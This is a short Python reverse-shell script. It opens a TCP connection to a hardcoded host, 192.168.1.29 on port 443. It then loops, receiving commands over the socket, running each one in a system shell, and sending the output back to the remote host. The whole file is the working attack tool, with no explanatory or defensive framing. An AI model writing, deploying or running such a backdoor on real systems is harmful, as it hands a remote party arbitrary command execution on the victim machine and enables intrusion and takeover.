import socket
import subprocess
import sys
 
RHOST = "192.168.1.29"
RPORT = 443
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((RHOST, RPORT))
 
while True:
     data = s.recv(1024)
     conn = subprocess.Popen(data, shell=True, stdout=subprocess.PIPE,
                             stderr=subprocess.PIPE, stdin=subprocess.PIPE)
     STDOUT, STDERR = conn.communicate()
     s.send(STDOUT)
s.close()